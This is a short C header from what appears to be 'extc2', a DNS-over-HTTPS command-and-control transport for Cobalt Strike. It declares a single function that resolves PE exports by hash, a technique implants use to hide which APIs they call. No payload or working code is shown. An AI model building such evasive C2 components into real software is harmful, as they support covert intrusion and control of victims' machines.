/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

/*-
 *
 * PeGetFuncEat
 *
 * Purpose:
 *
 * Parses an PE's export address table for 
 * a function matching the specified hash.
 *
-*/
DEFINESEC(B) PVOID PeGetFuncEat( IN PVOID Ptr, IN ULONG Hsh );
